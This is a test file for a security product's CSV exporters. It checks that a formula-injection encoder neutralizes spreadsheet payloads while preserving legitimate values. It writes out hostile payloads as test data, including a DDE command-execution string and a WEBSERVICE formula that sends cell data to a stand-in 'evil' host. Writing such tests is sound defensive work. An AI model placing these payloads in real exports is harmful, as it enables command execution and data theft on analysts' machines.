/* Release blocker RB-1: CSV formula injection (CWE-1236) in customer exports.
 *
 * The audit-log, SIEM, and threat-intel CSV exporters quote-escaped for CSV
 * structure but did NOT neutralize spreadsheet formula execution. A hostile
 * value in attacker-influenceable data (actor name, threat title, IOC, resource)
 * such as `=cmd|'/c calc'!A1` or `=WEBSERVICE("http://evil/"&A1)` would execute
 * when a customer's SOC/compliance analyst opened the export in Excel/Sheets —
 * an automatic enterprise-procurement blocker for a security product.
 *
 * These lock the canonical csvSafe encoder and prove every dangerous prefix is
 * neutralized while legitimate data (incl. negative numbers) is preserved.
 */
import { describe, it, expect } from 'vitest';
import { csvCell, csvRow } from '../src/lib/csvSafe.js';

describe('csvCell — formula-injection neutralization (CWE-1236)', () => {
  const attacks = [
    '=cmd|\'/c calc\'!A1',
    '=1+1',
    '+1+1',
    '-2+3',
    '@SUM(A1:A9)',
    '=HYPERLINK("http://evil","click")',
    '=WEBSERVICE("http://evil/"&A1)',
    '\t=1+1',
    '\r=1+1',
  ];
  for (const a of attacks) {
    it(`neutralizes ${JSON.stringify(a)} (leading formula char)`, () => {
      const out = csvCell(a);
      // The rendered cell must NOT begin with a formula trigger — it is prefixed
      // with a single quote (optionally then wrapped in structural quotes).
      const unwrapped = out.startsWith('"') ? out.slice(1) : out;
      expect(unwrapped[0]).toBe("'");
    });
  }

  it('preserves legitimate negative and decimal numbers (no over-escaping)', () => {
    expect(csvCell(-5)).toBe('-5');
    expect(csvCell('-5')).toBe('-5');
    expect(csvCell(3.14)).toBe('3.14');
    expect(csvCell('-2.5')).toBe('-2.5');
  });

  it('preserves ordinary text and applies structural quoting for commas/quotes/newlines', () => {
    expect(csvCell('CVE-2024-3400')).toBe('CVE-2024-3400');
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('he said "hi"')).toBe('"he said ""hi"""');
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('a comma inside a neutralized formula stays quoted AND prefixed', () => {
    const out = csvCell('=A1,B1');
    expect(out).toBe('"\'=A1,B1"'); // quote-wrapped, quote-prefixed inside
  });

  it('csvRow joins cells safely', () => {
    expect(csvRow(['=1+1', 'ok', 'a,b'])).toBe("'=1+1,ok,\"a,b\"");
  });
});

// Exercise the real audit-log exporter end-to-end (it builds CSV via csvRow).
import { handleAuditExport } from '../src/handlers/auditLog.js';
describe('audit-log CSV export neutralizes injected fields', () => {
  it('a malicious actor/resource does not produce a formula cell', async () => {
    const evilActor = '=cmd|\'/c calc\'!A1';
    const kv = {
      async list() { return { keys: [{ name: 'audit:2026-07-03:x' }] }; },
      async get() {
        return JSON.stringify({
          id: 'a1', timestamp: '2026-07-03T00:00:00Z', type: 'auth.login',
          actor: evilActor, actor_tier: 'FREE', ip: '1.2.3.4',
          resource: '=HYPERLINK("http://evil")', action: 'login', outcome: 'ok', org_id: '',
        });
      },
    };
    const req = new Request('https://x/api/audit-log/export?date=2026-07-03&format=csv');
    // isAdmin: true — this test is about CSV formula-injection neutralization,
    // not tenant scoping, so bypass the (correctly-enforced, see auditLog.js)
    // per-tenant filter rather than constructing a matching actor/org_id.
    const res = await handleAuditExport(req, { SECURITY_HUB_KV: kv }, { authenticated: true, user_id: 'u1', tier: 'ENTERPRISE', isAdmin: true });
    expect(res.status).toBe(200);
    const body = await res.text();
    // No data line may begin a cell with a raw formula trigger.
    const dataLines = body.split('\n').slice(1).filter(Boolean);
    for (const line of dataLines) {
      for (const cell of line.split(',')) {
        const c = cell.startsWith('"') ? cell.slice(1) : cell;
        expect(/^[=+\-@\t\r]/.test(c) && !/^-?\d/.test(c)).toBe(false);
      }
    }
    expect(body).toContain("'=cmd"); // the actor was neutralized, not dropped
  });
});
